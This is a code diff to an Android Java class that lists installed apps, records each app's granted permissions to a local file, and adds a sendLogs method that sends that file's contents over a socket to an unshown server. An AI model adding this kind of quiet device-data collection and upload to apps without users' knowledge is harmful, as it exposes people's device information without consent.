@@ -11,35 +11,45 @@ import android.util.Log;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.util.ArrayList;
 import java.util.List;
 
+/***
+ *
+ */
 public class ApplicationInfo {
     DeviceInfo deviceInfo;
-
+    FileIO file;
     Context context;
     String appInfo = "ApplicationInfo";
+    String fileName = "permissions.txt";
     List<ResolveInfo> installedApps;
 
-    public ApplicationInfo(Context mContext, DeviceInfo dInfo)
+    /***
+     *
+     * @param mContext
+     */
+    public ApplicationInfo(Context mContext)
     {
-        context = mContext;
-        deviceInfo = dInfo;
+        context = mContext.getApplicationContext();
+        file = new FileIO(mContext);
     }
 
-    public String getInstalledApplications()
+    /***
+     *
+     * @return
+     */
+    public List<String> getInstalledApplications()
     {
+        List<String> packageNames = new ArrayList<String>();
         Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
         mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
         installedApps = context.getPackageManager().queryIntentActivities(mainIntent, 0);
-        Log.i(appInfo, Integer.toString(installedApps.size()));
-        for(int i = 0; i < installedApps.size() - 10; i++)
+        for (ResolveInfo app : installedApps)
         {
-            String appName = installedApps.get(i).loadLabel(context.getPackageManager()).toString();
-            //Log.i(appInfo, appName);
+            packageNames.add(app.activityInfo.applicationInfo.packageName);
         }
-        //ResolveInfo lastapp = installedApps.get(installedApps.size());
-        //String appName = lastapp.loadLabel(context.getPackageManager()).toString();
-        return "";
+        return packageNames;
     }
 
     public void getRunningApplications()
@@ -53,45 +63,41 @@ public class ApplicationInfo {
         }
     }
 
-    public String getPermissions()
+    /***
+     *
+     * @return
+     */
+    public void getPermissions()
     {
-        String permissions = "";
-        try
-        {
-            for (ResolveInfo app : installedApps)
-            {
+        String permissions;
+        for (ResolveInfo app : installedApps) {
+            try {
                 String packageName = app.activityInfo.applicationInfo.packageName;
                 PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_PERMISSIONS);
+                permissions = packageName + ",";
+                int permissionLength = packageInfo.requestedPermissions.length - 1;
 
-                for(int i = 0; i < packageInfo.requestedPermissions.length - 1; i++) {
-                    if ((packageInfo.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0)
-                    {
-                        permissions += packageInfo.requestedPermissions[i] + "\n";
+                for (int i = 0; i < permissionLength; i++) {
+                    if ((packageInfo.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) {
+                        permissions += packageInfo.requestedPermissions[i] + ",";
                     }
                 }
+
+                permissions += "\n";
+                file.writeToFile(permissions, fileName);
             }
-
+            catch (Exception ex)
+            {
+                Log.i(appInfo, ex.getMessage());
+            }
         }
-        catch (Exception ex)
-        {
-            Log.i(appInfo, ex.getMessage());
-        }
-        return permissions;
     }
 
-    public String getProcessLogs()
-    {
-        String command = "top -n 1";
-
-        int versionNo = Integer.parseInt(String.valueOf(deviceInfo.versionNo.charAt(0)));
-        /*if(versionNo >= 8)
-        {
-            command += " -o NAME";
-        }*/
-
-        return createProcessLogs(command);
-    }
-
+    /***
+     *
+     * @param command
+     * @return
+     */
     public String createProcessLogs(String command)
     {
         StringBuilder stringBuilder = new StringBuilder();
@@ -121,10 +127,12 @@ public class ApplicationInfo {
             Log.d(appInfo, "IO Exception: " + ex.getMessage());
         }
         String topResults = stringBuilder.toString();
-        Log.i(appInfo, topResults);
         return stringBuilder.toString();
     }
 
+    /***
+     *
+     */
     public void getRunningAppInfo()
     {
         ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
@@ -135,24 +143,14 @@ public class ApplicationInfo {
         }
     }
 
-
-    /*public void writeToFile(String info)
+    /***
+     *
+     */
+    public void sendLogs()
     {
-        try
-        {
-            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("D:\\top.txt", Context.MODE_PRIVATE));
-            outputStreamWriter.write(info);
-            outputStreamWriter.close();
-        }
-        catch (FileNotFoundException ex)
-        {
-
-        }
-        catch (IOException ex)
-        {
-
-        }
-
-    }*/
+        SocketClient socketClient = new SocketClient();
+        String content = "|" + file.readFile(fileName);
+        socketClient.execute(content + "~");
+    }
 
 }
